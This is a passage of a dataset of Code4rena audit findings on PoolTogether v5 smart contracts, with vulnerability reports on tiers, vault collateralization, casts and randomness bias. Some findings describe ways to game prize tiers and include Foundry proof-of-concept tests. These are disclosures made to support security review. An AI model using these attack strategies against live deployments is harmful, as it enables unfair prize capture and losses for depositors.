_numTiers; +      }      }        return _nextNumberOfTiers;  ```   ## Assessed type  Math"}, {"title": "Tiers can be mantained active to give unfair advantage to user through DoS", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/331", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-15"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L784 https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L173   # Vulnerability details  ## Impact Tiers can be maintained active by claiming a single prize of the last tier at a loss.  The protocol will close tiers of the next draw based on the [largest tier claimed](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L784) of the draw being closed, which is [registered during the claiming of the prizes](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L446).   This is a symptom that liquidity is being spread too thin on the last tier, and its no longer profitable for bots to claim prizes for users since their gas costs are over the claiming fees they earn.     The closing of a tier is meant to increase `maxFee`, which is the highest price a claiming fee can achieve in the reverse Dutch auction mechanism, which in the current draw isn't enough for the bot to be profitable.    The [maxFee is computed based on the last active tier's prize size](https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L169C1-L177C4), and by lowering the amount of tiers, the liquidity is going to get concentrated in less tiers and in less prizes(since the number of prizes is 4^tierNumber), making the bots profitable again and incentivizing them to claim prizes for users.     During the draw where there are no incentives for bots to claim prizes, prizes won't get claimed, which means that if someone won a high prize from a low tier, they would have to manually claim it or the liquidity of that prize will continue onto the next draw, leaving the user without a possibility of claiming his prize once the draw has passed.  **A malicious actor that has deposited liquidity in the vaults that contribute to the prize pool could take advantage of this mechanic.**  By having a bot that in this closing tier state claims his prizes when available, and claims a single prize from the highest tier, he is able to maintain the tier active, which will cause following draws to fall again into the state where bots don't claim prizes. This hugely decreases the probability of winning for users that don't have a claiming bot while giving the malicious actor an unfair advantage.      ## Proof of Concept   ```Draw 0```: `closeDraw` has just been executed and the remaining liquidity from the previous draw with the newly added liquidity for this draw computes a `maxFee` that isn't enough to cover gas costs for bots to claim prizes, therefore the last tier is supposed to be closed. A malicious actor can claim a random single prize from the last tier at a loss to maintain the tier active, also claiming any prizes he might have won.     ```Draw 1```:  new liquidity is added to the system, which will make the last tier's prize size increase, and subsequently, the `maxFee` will increase. Depending on how much liquidity is added, maxFee will or won't be enough for bots to start claiming prizes since the last tier has accumulated the liquidity of two draws.  *It could be the case that the added liquidity isn't enough and creates a draw state similar to draw 0, but to continue with the example let's assume that the accumulated liquidity of two draws computes a maxFee that is enough to incentivize bots to claim prizes.*  Draw 1 behaves as expected, which means that the last tier's liquidity would get claimed, and the following draw would rely mostly on the newly added liquidity. \"Mostly\" since there will be a remanent part of liquidity from the prizes that haven't been won.    ```Draw 2```: The situation of draw 0 repeats itself, the added liquidity on this draw is not concentrated enough to incentivize bots to claim prizes. The malicious actor claims a single prize at a loss again, to keep the tier active, also claiming any prizes he might have won.    This results in a situation where, depending on how much liquidity is added to each draw, many draws could result inactive, meaning that unless users claim their own prizes no one is going to claim them, while the malicious actor has an advantage since his bot will claim his prizes, apart from maintaining the highest tier active.    ## Tools Used Manual review  ## Recommended Mitigation Steps  Changing the mechanism by which largestTierClaimed is set so that it's resistant to a single user performing a claim.             ## Assessed type  DoS"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/323", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-09"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/keccak123-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/315", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-12"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/petrichor-G.md)."}, {"title": "Threshold check for adding of new tiers is skipped when `_nextNumberOfTiers` is at the maximum", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/314", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-16"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L789-L791   # Vulnerability details  ## Impact Wrong implementation allows new tier to be added as the threshold check is not done when we currently have  14 tiers. This means that with just a single canary claim, a new tier will be added when number of tiers == 14.  ## Proof of Concept In order for the prize pool to add new tiers, the normal prize claim count and canary tier claim count must pass a certain threshold. This check is done by the below code snippet.  [PrizePool.sol#L794-L804](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L794-L804) ```solidity     if (       _nextNumberOfTiers >= _numTiers &&       canaryClaimCount >=       fromUD60x18(         intoUD60x18(_claimExpansionThreshold).mul(_canaryPrizeCountFractional(_numTiers).floor())       ) &&       claimCount >=       fromUD60x18(         intoUD60x18(_claimExpansionThreshold).mul(toUD60x18(_estimatedPrizeCount(_numTiers)))       )     ) { ``` However, in the case where `_nextNumberOfTiers >= MAXIMUM_NUMBER_OF_TIERS`, `MAXIMUM_NUMBER_OF_TIERS` is instantly returned, skipping this check.  [PrizePool.sol#L784C1-L791C6](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L784C1-L791C6) ```solidity     uint8 _nextNumberOfTiers = largestTierClaimed + 2; // canary tier, then length     _nextNumberOfTiers = _nextNumberOfTiers > MINIMUM_NUMBER_OF_TIERS       ? _nextNumberOfTiers       : MINIMUM_NUMBER_OF_TIERS;      if (_nextNumberOfTiers >= MAXIMUM_NUMBER_OF_TIERS) {       return MAXIMUM_NUMBER_OF_TIERS;     } ```  As seen from the above code, if we currently have 14 tiers and the canary tier is claimed in this draw hence `largestTierClaimed = 13`, then we have `_nextNumberOfTiers = 15`. Since `MAXIMUM_NUMBER_OF_TIERS == 15`, we `return MAXIMUM_NUMBER_OF_TIERS` and hence the new number of tiers is going to be 15 even if the number of claims for this draw does not pass the threshold check.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Make sure that we do the threshold check specifically for in the case where `_numTiers == 14` and `canaryClaimCount >= 1`.   ## Assessed type  Invalid Validation"}, {"title": "Inherent bias in selection of winner towards vaults with a higher total supply", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/311", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-18"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/TierCalculationLib.sol#L91-L97   # Vulnerability details  ## Impact Inherence bias in modulo in generating random numbers will result in users using vaults with a higher total supply being more likely to win compared to users using a vaults with a lower total supply.  ## Proof of Concept Using modulo to generate random numbers have an inherent bias. To better illustrate this bias, we can generate the number of occurence for the random number x that is only slightly bigger than modulo y. In the below example, `x = 255`, and `y = 107` is used.   ![Image from [kudelskisecurity](https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/)](https://github.com/yixxas/ethernaut_challenge/assets/68470272/eb77d574-490b-4fd9-a1dc-a2783cb0d30d)  As we can see in this example, modulo introduces a bias in the first 42 numbers. This is due to how smaller numbers can show up more times than their bigger counterparts. But we must note that this bias is reduced the bigger the difference in the x and y value.  Now in our case, we are using `x = _userSpecificRandomNumber` and `y = _vaultTwabTotalSupply`. `_userSpecificRandomNumber` is the `keccak256` output hence can be understood as uniformly distributed over the range of uint256. `_vaultTwabTotalSupply`, on the other hand is a number much smaller than this as it is the total supply of vault's balance in 18 decimals. This bias may be considered too small to matter in our case if we are only concerned for a single random number.  However, we are checking for a range of numbers, or more specifically the user who is deemed a \"winner\" is one whose random number fall below the winning zone. This means that a range of numbers matter depending on the size of the zone. The zone is calculated as `_userTwab * _vaultContributionFraction * _tierOdds`. This zone can be huge depending on various factors such as the tier we are in. In this case, the bias introduced in the modulo operator are biased towards smaller numbers and the severity is bolstered by the fact that in our current implementations of selecting winners, we are only interested in smaller numbers since we want them to fall below the zone.  The end result is that vaults with a higher total supply, hence more bias towards producing smaller numbers, have a higher odds of being a winner compared to that of a vault with a smaller total supply.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider using other forms of random number generation that does not favour vaults of different supply.        ## Assessed type  Math"}, {"title": "Bad use of hardcoded dates values", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/310", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-19"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/libraries/ObservationLib.sol#L16   # Vulnerability details  ## Impact The developers are using a constant named `MAX_CARDINALITY` as the maximum size of the [_observations](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/libraries/ObservationLib.sol#L56) parameter  ``` uint16 constant MAX_CARDINALITY = 365; // 1 year  function binarySearch(     Observation[MAX_CARDINALITY] storage _observations,     uint24 _newestObservationIndex,     uint24 _oldestObservationIndex,     uint32 _target,     uint16 _cardinality,     uint32 _time ) ```  which is used as a buffer to store one year's observations and do search through the function [binarySearch](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/libraries/ObservationLib.sol#L55). However, it only defines 365 observations (not the Solidity's year, which is 60\\*60\\*24\\*365 >>> 365) for the whole year, meaning that it may not be enough (for sure) to store all of the records/observations.  ## Proof of Concept Suppose that the rate of observations is twice a day. That means, for the day 182/183 it will start overwriting the initial ones (ring buffer) which leads to just searching for a \"time-block\" of 6 months instead of the year the devs wanted. From the code:  ``` /**  * @dev Sets max ring buffer length in the Account.observations Observation list.  *         As users transfer/mint/burn tickets new Observation checkpoints are recorded.  *         The current `MAX_CARDINALITY` guarantees a one year minimum, of accurate historical lookups. ... ```  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Use the `1 year` from Solidity instead of hard-coding the value (check for gas too because loading every time such a big array would make it cost A LOT, which could incur in an OOG)   ## Assessed type  Error"}, {"title": "`DrawAccumulatorLib.getDisbursedBetween` can revert when a correct `_endDrawId` is provided", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/304", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-20"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L190-L192   # Vulnerability details  ## Impact Calling `PrizePool.getTotalContributedBetween` or `PrizePool.getContributedBetween` can revert when a correct `_endDrawIdInclusive` is provided. Third-party integration and off-chain analysis tools won't be able to obtain the total contributed amounts or the contributed amounts of a vault. ## Proof of Concept The [DrawAccumulatorLib.getDisbursedBetween](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L166) function limits the `_endDrawId` argument: it cannot be more than draw before the last observed draw. To validate the value of the argument, the function [calls `readDrawIds`](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L183) obtain the oldest and the newest observations (the newest is stored in `drawIds.second`) and then compares the draw ID of the newest observation with the value of `_endDrawId` ([DrawAccumulatorLib.sol#L190-L192](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L190-L192)): ```solidity if (_endDrawId < drawIds.second - 1) {     revert InvalidDisbursedEndDrawId(_endDrawId); } ```  However, not every draw has an observation, and a previous observation can have a draw ID that's smaller than the newest observation's draw ID - 1. Observations are created in the [DrawAccumulator.add](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L82-L84) function, which is only called when a new contribution is made to the prize pool ([PrizePool.sol#L311-L327](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L311-L327)). Thus, the following situation is possible: 1. the draw ID of the newest observation is 10 (a contribution was made in draw 10); 1. the draw ID of the observation before the newest one is 8 (a contribution was made in draw 8).  I.e., there were no contributions in draw 9 and no observations were created for the draw. In this case, when calling `DrawAccumulatorLib.getDisbursedBetween`, a correct value of `_endDrawId` would be 8 (the ID of the observation before the newest observation), however the function won't allow values smaller than 9, even though there's no observation for draw 9.  ## Tools Used Manual review ## Recommended Mitigation Steps When validating the value of `_endDrawId` in `DrawAccumulatorLib.getDisbursedBetween`, consider comparing it to the actual draw ID of the observation before the newest one, e.g. using: ```solidity _accumulator.drawRingBuffer[     RingBufferLib.offset(indexes.second, 1, ringBufferInfo.cardinality) ]; ``` To obtain the draw ID of the observation before the newest one.   ## Assessed type  Other"}, {"title": "Liquidating yield can lead to undercollateralization of the vault", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/302", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L580-L582   # Vulnerability details  ## Impact A vault can become undercollateralized as a result of a yield liquidation. Minting yield fee and liquidating yield won't be possible in this situation until the vault is (over)collateralized again. ## Proof of Concept During yield liquidation, more shares can be minted than the amount of yield in the yield vault. This will affect the exchange rate, bringing it below 1 and making the vault undercollateralized. The vault will, however, keep excessive unaccounted tokens on its balance, which could be used to improve the exchange rate.  The [Vault.liquidate](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L550) function is used to liquidate yield: 1. the yield earned by the underlying yield vault is [compensated by minting an equivalent amount of shares](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L584); 1. an equivalent amount of prize tokens is [contributed to the prize pool by the caller](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L570).  The amount of yield that can be liquidated is [determined by the `_liquidatableBalanceOf` function](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L566). The function [calls `availableYieldBalance` under the hood](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L832). `availableYieldBalance` [calls `_totalAssets`](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L312C1-L312C1) to determine the total amount of assets controlled by the vault. The amount is made of: the total assets that can be withdrawn from the yield vault and the total assets held by the vault contract ([Vault.sol#L800-L802](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L800-L802)): ```solidity function _totalAssets() internal view returns (uint256) { return _yieldVault.maxWithdraw(address(this)) + super.totalAssets(); } ``` [ERC4626.sol#L98](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d26025b4103b8d053684a75129a16852d1ae95c0/contracts/token/ERC20/extensions/ERC4626.sol#L98) ```solidity function totalAssets() public view virtual override returns (uint256) {     return _asset.balanceOf(address(this)); } ```  The `Vault.liquidate` function can also deposit the assets held by the vault to the underlying yield vault. However, this is only done when the total amount of liquidated balance is greater than or equal the balance of the assets ([Vault.sol#L580-L582](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L580-L582)): ```solidity if (_vaultAssets != 0 && _amountOut >= _vaultAssets) {     _yieldVault.deposit(_vaultAssets, address(this)); } ```  This allows a situation when the amount of minted shares is greater than the amount of liquidated yield. Consider this example: 1. Suppose that: `_yieldVault.maxWithdraw(address(this))` is 15 and `super.totalAssets()` is 10 (i.e. `_totalAssets` returns 25); `_sharesToAssets` is 10, so that [availableYieldBalance](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L311) returns 15 (the yield that can be liquidated). The yield balance is made of 5 actual yield tokens and 10 tokens on the balance of the vault. Also suppose that the yield fee is 0. 1. When calling `Vault.liquidate`, the caller sets `_amountOut` to 7, i.e. they're willing to liquidate 7 yield tokens. The function will mint 7 shares, however it won't deposit the 10 tokens to the yield vault, because `_amountOut` is less than the balance of the tokens (10). 1. The minting of 7 shares will skew the withdrawable assets to total supply amount ratio in the [_currentExchangeRate](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1168) function: `_totalSupplyToAssets` will now be bigger than `_withdrawableAssets`, which will result in an exchange rate that is less than 1. In other words, the vault is now undercollateralized.  ## Tools Used Manual review ## Recommended Mitigation Steps The simplest solution seems to always deposit the tokens controlled by the vault to the yield vault during liquidations. However, it's not really clear why depositing should be done during liquidations at all.  A more reasonable solution seems to not deposit tokens during liquidation at all. Since the `Vault.deposit` function can handle the tokens held by the vault, it would be more reasonable to just let anyone deposit the tokens via a call to the `deposit` function.   ## Assessed type  Token-Transfer"}, {"title": "`setLiquidationPair` in `Vault.sol` can revert 100% in some cases which makes changing `_liquidationPair` impossible", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/301", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-21"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L673-L675   # Vulnerability details  ## Impact The function `setLiquidationPair` is used to set the `_liquidationPair` by the owner, which is the only address that is able to call `liquidate`. The functions checks if the `_previousLiquidationPair` is address 0 and if that is not the case, it will reset the allowance of that address to 0 as can be seen here https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L674 The problem relies in the fact that there are some ERC20 tokens that revert if the value of `transfer`, `transferFrom` and `approve` is 0, one very big example of this is BNB, one of the ERC20's with the largest market caps which is wieldy used. ## Proof of Concept An user creates a `Vault`, calling `deployVault` in `VaultFactory.sol` with the `asset` token being BNB. The `_liquidationPair` is set to be a ***singleton contract per-chain*** ,as it is stated in the description of the project. This singleton contract, that manages every `liquidate` calls on all the vaults, gets redeployed or gets upgraded and all of the `Vaults` needs their `_liquidationPair` updated as well. The owners who has BNB as their `asset` token will try to call `setLiquidationPair` but this will revert all the time because the function will try to `approve` to 0 the `_previousLiquidationPair`, thus reverting all the time https://etherscan.io/token/0xB8c77482e45F1F44dE1745F52C74426C631bDD52#code#L94 . This will make updating the `_liquidationPair` for those contracts impossible, which also makes the `liquidate` impossible to be called.  ## Tools Used Manual review ## Recommended Mitigation Steps Consider specify to the user that BNB or any token that revert on 0 values are not able to interact with the protocol as intended or don't try to `approve` to 0 `_previousLiquidationPair` and just `approve` the new `_liquidationPair` with the amount needed.   ## Assessed type  ERC20"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/289", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-10"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/Jeiwan-Analysis.md)."}, {"title": "Exchange Rate Change in Case of Lossy Strategy will cause the Vault to Undercollateralized for generic ERC4626 Yield Vaults ", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/256", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-18"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L509-L521   # Vulnerability details  For Yield Vaults that use Lossy Strategies, the PT Vault will burn more Yield Vault Shares than intended when processing a withdrawal, socializing a loss at the advantage of early withdrawers  `withdraw` calls `_convertToShares`  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L517  ```solidity     uint256 _shares = _convertToShares(_assets, Math.Rounding.Up); ```  Which uses the `_currentExchangeRate()`  This in turn computes the `withdrawableAssets` by fetching `yieldVault.maxWithdraw` and then mapping the principal vs the totalSupply  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1169C1-L1187C4  ```solidity     uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this));      if (_withdrawableAssets > _totalSupplyToAssets) {       _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);     }      if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {       return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);     }   ```  This calculation is based on `maxWithdraw`, which is a `view` function  Most implementation of\u00a0`maxWithdraw` will simply map the available tokens to the shares owned by the owner, see OZ for example:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/121be5dd09caa2f7ce731f0806b0e14761023bd6/contracts/token/ERC20/extensions/ERC4626.sol#L141-L143  ```solidity     function maxWithdraw(address owner) public view virtual returns (uint256) {         return _convertToAssets(balanceOf(owner), Math.Rounding.Floor);     } ```  Or similarly, [Yearn V3](https://github.com/yearn/yearn-vaults-v3/blob/1e6bc67cf70352e9567e67404d73856cc343b634/contracts/VaultV3.vy#L559-L562)   Due to the implementation, losses can be applied during `YieldVault.withdraw`, causing the burning of more shares than intended  Because the PT Vault computes the shares to burn before accounting for a potential loss:  - No loss will be accounted for in `maxWithdraw` (since it will use static value for assets in the vault and assets in the strategy)  - The loss will be locked during `_withdraw`, but it will not be checked, the specifics of the loss are that it will cause burning of more shares in order to receive the intended `assets`  - This will cause the user to pay `shares` from PT Vault  - But it will cause PT Vault to pay more `yieldVault Shares` than intended, effectively diluting everyone else and socializing the losses on the laggards    ## Proof Of Concept - Call withdraw - This will compute the shares to burn to the user via `_convertToShares` - PT Vault will call YieldVault.withdraw with the amount necessary to withdraw - The Vault will take a loss, the loss will cause more shares from PT Vault to be burned, socializing a loss to other depositors   ## Mitigation  Ensures that the PPFS of the Yield Vault doesn't decrease, or add functions to handle lossy withdrawals      ## Assessed type  ERC4626"}, {"title": "Silent overflow could alter computation when calculating the vaultPortion in the PrizePool contract", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/243", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-19"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L962-L970   # Vulnerability details  ## Impact - If an overflow happens, the computed value of the vault portion will be a totally different value than what should really be, which would end up causing the rewards to disburse to be lower for the draw that was used to compute the vault portion.  ### Note:  Even though [the bot reported issues about downcasting variables](https://gist.github.com/itsmetechjay/e7fd03943bbacff1984a33b9f89c4149#low-4-use-safecast-to-safely-downcast-variables), it didn't mention this specific unsafe casting, which if an overflow occurs could cause a huge impact on the calculation of the vault portions.  ## Proof of Concept - When computing the vaultPortion to the PrizePool over a specific duration in draw, the values of the [`vaultContributed`](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L963-L968) & [`totalContributed`](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L951-L956) variables are computed on the DrawAccumulatorLib library, and [they are computed and returned as `uint256` values.](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L166-L307)  - The issue is that in the `PrizePool::_getVaultPortion()` the `vaultContributed` & `totalContributed` variables are unsafely casted from uint256 to int256, which could lead to a silent overflow if any of the two original values don't fit on an `int256`   - As a result of a silent overflow, the computed value of the vault portion will be a totally different value than what should really be, which would end up causing the rewards to disburse to be lower for the draw that was used to compute the vault portion.  ## Tools Used Manual Audit  ## Recommended Mitigation Steps - Make sure to implement a safe cast that checks if overflows occur to prevent computing a totally different value than what it should really be.   - Use OZ safeCast library for this type of operation.    ## Assessed type  Under/Overflow"}, {"title": "Improper handling of cases when withdrawable assets = 0", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/180", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-20"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1182-#L1186   # Vulnerability details  ## Impact - Improper handling of cases when withdrawable assets = 0 - The vault will not function correctly.  ## Proof of Concept The function `_currentExchangeRate` and `_isVaultCollateralized` of `Vault` are implemented as follows: ```solidity function _currentExchangeRate() internal view returns (uint256) {     uint256 _totalSupplyAmount = _totalSupply();     uint256 _totalSupplyToAssets = _convertToAssets(       _totalSupplyAmount,       _lastRecordedExchangeRate,       Math.Rounding.Down     );      uint256 _withdrawableAssets = _yieldVault.maxWithdraw(address(this));      if (_withdrawableAssets > _totalSupplyToAssets) {       _withdrawableAssets = _withdrawableAssets - (_withdrawableAssets - _totalSupplyToAssets);     }      if (_totalSupplyAmount != 0 && _withdrawableAssets != 0) {       return _withdrawableAssets.mulDiv(_assetUnit, _totalSupplyAmount, Math.Rounding.Down);     }      return _assetUnit;   }  function _isVaultCollateralized() internal view returns (bool) {     return _currentExchangeRate() >= _assetUnit; } ``` The function `Calculate exchange rate between the amount of assets withdrawable from the YieldVault and the amount of shares minted by this Vault.` However, if `_withdrawableAssets` is 0, then the function returns `_assetUnit` (which means 1-1 ratio). This means that even when the `vault` has no withdrawable assets from `_yieldVault`, it's still considered `collateralized`.    To illustrate the oddity of this special case, consider when `_withdrawableAssets` = 1 and `_totalSupplyAmount` > 0; in this scenario, `_currentExchangeRate` returns 0 and the vault is considered under-collateralized (since 1 < `_assetUnit`). However, if `_withdrawableAssets` = 0, the vault is considered collateralized.  **This case has profound impact since a lot of vault logic is based on the vault's collateralized status.**   Below is a POC for the above example, for ease of testing, let's place these 2 test cases  in file `vault/test/unit/Vault/Deposit.t.sol` under contract `VaultDepositTest`, then test them using commands: `forge test --match-path test/unit/Vault/Deposit.t.sol --match-test testOneWithdrawableAmount -vvvv` `forge test --match-path test/unit/Vault/Deposit.t.sol --match-test testZeroWithdrawableAmount -vvvv`  `testOneWithdrawableAmount` is to demonstrate when `_withdrawableAssets` = 1 and the vault is considered not collateralized, `testZeroWithdrawableAmount` is to demonstrate when `_withdrawableAssets` = 0 and the vault is considered collateralized.   ```solidity function testZeroWithdrawableAmount() public {     vm.startPrank(alice);     uint256 _amount = 1000e18;     underlyingAsset.mint(alice, _amount);     underlyingAsset.approve(address(vault), type(uint256).max);      vault.deposit(_amount, alice);           // Now make the withdrawable asset = 0     // Burn the balance of yieldVault     uint256 yieldVaultAsset = underlyingAsset.balanceOf(address(yieldVault));     underlyingAsset.burn(address(yieldVault), yieldVaultAsset);      assertEq(underlyingAsset.balanceOf(address(yieldVault)), 0);      // Although the vault has no asset withdrawable in yieldVault     // the exchange rate is 10**18 = assetUnit and the vault is \"collateralized\"     assertEq(yieldVault.maxWithdraw(address(vault)), 0);     assertEq(vault.exchangeRate(), 10**18);     assertEq(vault.isVaultCollateralized(), true);   }    function testOneWithdrawableAmount() public {     vm.startPrank(alice);     uint256 _amount = 1000e18;     underlyingAsset.mint(alice, _amount);     underlyingAsset.approve(address(vault), type(uint256).max);      vault.deposit(_amount, alice);           // Now make the withdrawable asset = 0     // Burn the balance of yieldVault     uint256 yieldVaultAsset = underlyingAsset.balanceOf(address(yieldVault));     underlyingAsset.burn(address(yieldVault), yieldVaultAsset -1);      assertEq(underlyingAsset.balanceOf(address(yieldVault)), 1);      // vault only has 1 asset token withdrawable, and the exchangeRate is 0     // the vault is not collateralized     assertEq(yieldVault.maxWithdraw(address(vault)), 1);     assertEq(vault.exchangeRate(), 0);     assertEq(vault.isVaultCollateralized(), false);   } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Since `_withdrawableAssets` is the dividend, there seems to be no harm in removing the check if `_withdrawableAssets` = 0. Therefore, I recommend removing it from the condition.       ## Assessed type  Invalid Validation"}, {"title": "Vault contribution calculations wrongly 